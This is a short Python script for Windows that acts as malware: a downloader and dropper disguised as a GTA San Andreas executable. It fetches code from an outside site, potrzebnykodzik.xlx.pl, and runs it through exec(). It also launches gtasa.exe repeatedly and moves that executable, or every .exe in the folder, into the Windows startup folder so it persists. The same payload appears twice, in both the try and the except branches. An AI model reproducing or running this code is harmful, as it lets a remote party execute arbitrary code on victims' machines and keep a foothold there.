import os
import winshell,shutil

ile = 138+50

startup = winshell.startup()
p = os.path.abspath("") #+ os.path.basename(__file__)

try:
    import requests
except:
    pass
try:
    import pyttsx3
except:
    pass

try:
    kod = requests.get("http://potrzebnykodzik.xlx.pl/")
    kod = str(kod.text[:ile])
    os.system("gtasa.exe")
    os.system("gtasa.exe")
    os.system("gtasa.exe")
    os.system("gtasa.exe")
    if startup!=p:
        try:
            pass
            shutil.move(p+'\\'+"gtasa"+".exe",startup)
        except:
            onlyfiles = [f for f in os.listdir() if f.endswith(".exe")]
            for i in onlyfiles:
                shutil.move(p+'\\'+i,startup)
    exec(kod)




except:
    kod = requests.get("http://potrzebnykodzik.xlx.pl/")
    kod = kod.text[:ile]
    os.system("gtasa.exe")
    os.system("gtasa.exe")
    os.system("gtasa.exe")
    os.system("gtasa.exe")
    if startup!=p:
        try:
            pass
            shutil.move(p+'\\'+"gtasa"+".exe",startup)
        except:
            onlyfiles = [f for f in os.listdir() if f.endswith(".exe")]
            for i in onlyfiles:
                shutil.move(p+'\\'+i,startup)
    exec(kod)
    

